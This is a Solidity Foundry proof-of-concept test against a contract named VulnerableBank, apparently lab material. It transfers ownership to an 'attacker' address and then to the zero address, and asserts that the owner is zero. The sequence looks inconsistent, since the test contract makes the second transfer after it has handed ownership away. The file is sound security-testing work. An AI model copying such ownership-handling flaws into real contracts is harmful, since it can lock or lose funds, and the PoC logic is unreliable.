// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./basetest.sol";
import "../src/49356772-e930-4cfa-8409-e51abe2c6e55_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Simulate regular operation
        vm.prank(address(this));
        target.transferOwnership(attacker);

        // Intentionally transfer ownership to the zero-address
        vm.prank(address(this));
        target.transferOwnership(address(0));

        // Verify that the ownership has been transferred to the zero-address
        assertEq(target.owner(), address(0));
    }
}